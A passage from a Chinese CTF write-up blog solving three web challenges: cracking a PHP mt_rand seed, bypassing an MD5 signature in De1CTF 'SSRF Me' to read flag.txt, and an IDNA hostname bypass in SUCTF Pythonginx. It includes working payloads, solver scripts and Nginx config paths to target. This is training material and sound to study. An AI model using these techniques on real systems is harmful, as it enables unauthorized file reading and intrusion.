src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202200452558.png" alt="" loading="lazy"></p><p>F12发现check.php，访问得到php源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#这不是抽奖程序的源代码！不许看！</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;p id='p1'>"</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>x        <span class="token keyword">echo</span> <span class="token string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>发现mt_srand()和mt_rand() 并且session是用随机数设置的</p><p>上爆破工具php_mt_seed和脚本得到随机数种子</p><pre class=" language-python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>str2<span class="token operator">=</span><span class="token string">'cTVM5ZeUkl'</span>length <span class="token operator">=</span> len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span>res<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            res<span class="token operator">+=</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>            <span class="token keyword">break</span><span class="token keyword">print</span> res</code></pre><p>得到</p><pre class=" language-shell"><code class="language-shell">2 2 0 61 55 55 0 61 57 57 0 61 48 48 0 61 31 31 0 61 61 61 0 61 4 4 0 61 56 56 0 61 10 10 0 61 11 11 0 61</code></pre><p>爆破</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202201906349.png" alt="" loading="lazy"></p><p>将得到的随机种子放到php脚本中</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">654818272</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>得到字符串</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202202206918.png" alt="" loading="lazy"></p><h2 id="De1CTF-2019—SSRF-Me"><a href="#De1CTF-2019—SSRF-Me" class="headerlink" title="De1CTF-2019—SSRF Me"></a>De1CTF-2019—SSRF Me</h2><p>点开链接得到源码</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! /usr/bin/env python</span><span class="token comment" spellcheck="true">#encoding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> socket<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> urllib<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> jsonreload<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#python的构造方法</span>        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">#SandBox For Remote_Addr</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>                       <span class="token comment" spellcheck="true">#定义的命令执行函数，此处调用了scan这个自定义的函数</span>        result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#action要写scan</span>                tmpfile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#文件读取</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> resp            <span class="token comment" spellcheck="true">#输出结果</span>                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#action要加read</span>                f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#!!!校验</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true">#generate Sign For Action Scan.</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#用于测试</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     action <span class="token operator">=</span> <span class="token string">"scan"</span>    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#实际注入</span><span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr   <span class="token comment" spellcheck="true">#获取用户ip</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#根目录路由</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#这是用来扫目录的函数</span>    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span><span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#MD5计算,此处注意顺序先是param后是action</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#无用的waf</span>    check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token operator">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span></code></pre><p>是一个利用flask框架搭的，有两个路由分别是<code>geneSign</code>和<code>De1ta</code></p><p>首先来读代码<code>geneSign</code>是用来计算传入的<code>param</code>+scan的md5值，应该是用于测试的</p><p><code>De1ta</code>分别可传入一个<code>get</code>参数<code>param</code>，两个<code>cookie</code>参数<code>action</code>和<code>sign</code>，并且<code>param</code>参数套了一层<code>waf</code></p><p>随后建立<code>Task</code>类使用<code>Exec</code>方法，在看看<code>Task</code>类是用来干什么的</p><p>里面可以<code>print</code>出<code>scan</code>方法后<code>param</code>的结果，根据题目提示<code>flag is in ./flag.txt</code>应该是让我们去想办法读取到flag文件然后输出</p><p>再看到<code>Exec</code>方法的第一个if，引用了<code>checkSign</code>方法，进行md5值的比较，这里是肯定要想办法绕过的了，问题是怎么绕？可以看到后面的if语句，如果我们想要读到<code>flag</code>，就需要让<code>action</code>中有<code>read</code>和<code>scan</code></p><p>再看到<code>geneSign</code>路由，里面固定死了<code>action</code>的值为<code>scan</code>，我们可以传入<code>param</code>的值来得到md5值</p><p>于是设想，如果<code>param</code>=<code>flag.txtread</code>，那么计算出来的md5值就是<code>flag.txtreadscan</code>的md5值，注意<code>getSign</code>方法虽然参数顺序不一样但是在函数中参数还是调了回来，我们将得到的md5赋给<code>sign</code>，再令<code>param</code>=<code>flag.txt</code>,<code>action</code>=<code>readscan</code>，那么<code>checkSign</code>不就可以返回<code>True</code>成功了比较吗，于是得到payload：</p><pre><code>param=flag.txtaction=readscan;sign=8bdad5e249bb114a8874247817be9bad</code></pre><p>抓包传入即可得到flag</p><h1 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h1><h2 id="SUCTF-2019—Pythonginx"><a href="#SUCTF-2019—Pythonginx" class="headerlink" title="SUCTF-2019—Pythonginx"></a>SUCTF-2019—Pythonginx</h2><p>首先看到题目给出的源码：</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 111"</span>    parts <span class="token operator">=</span> list<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 222 "</span> <span class="token operator">+</span> host    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#去掉 url 中的空格</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 333"</span></code></pre><p>我们可以传入url参数，要绕过前连两次<code>if</code>的判断也就是<code>host!=suctf.cc</code>，在最后一次要等于，就可以进行<code>urlopen(finalUrl).read()</code>文件读取的操作，推测是要我们进行文件读取</p><p><strong>Nginx下的重要文件位置</strong></p><pre><code>配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx配置文件目录为：/usr/local/nginx/conf/nginx.conf</code></pre><p>这里就要想办法如何绕过前面的两个if，而在第三个if的时候又要判断通过，可以看到在最后一个if语句的前面有这样的一个操作：<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>，先对里面的字符进行了<code>idna</code>编码，随后有进行了<code>utf-8</code>解码，详情<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">参考</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428121257327.png" alt="image-20200428121257327" loading="lazy"></p><p>大概意思就是通过这样的编码就可以对传入的数据进行绕过</p><p>于是用脚本进行测试</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span>urlunsplit<span class="token punctuation">,</span>urlsplit<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">def</span> <span class="token function">get_unicode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">65536</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        uni<span class="token operator">=</span>chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        url<span class="token operator">=</span><span class="token string">"http://suctf.c{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>uni<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> getUrl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str: "</span><span class="token operator">+</span>uni<span class="token operator">+</span><span class="token string">' unicode: \\u'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span>url    host<span class="token operator">=</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    parts<span class="token operator">=</span>list<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host<span class="token operator">=</span>parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token 